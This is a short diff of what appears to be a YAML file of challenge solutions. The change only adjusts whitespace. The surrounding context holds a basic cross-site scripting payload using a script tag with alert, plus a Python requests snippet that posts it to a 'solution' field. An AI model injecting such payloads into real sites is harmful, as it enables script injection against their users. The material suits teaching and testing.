@@ -13,9 +13,8 @@ tricks:
     how: "Use standard script tag with alert"
     payload: |
       <script>alert('XSS')</script>
-      
+
       # Python exploit:
       import requests
       payload = "<script>alert('XSS')</script>"
       requests.post(url, data={"solution": payload})
-
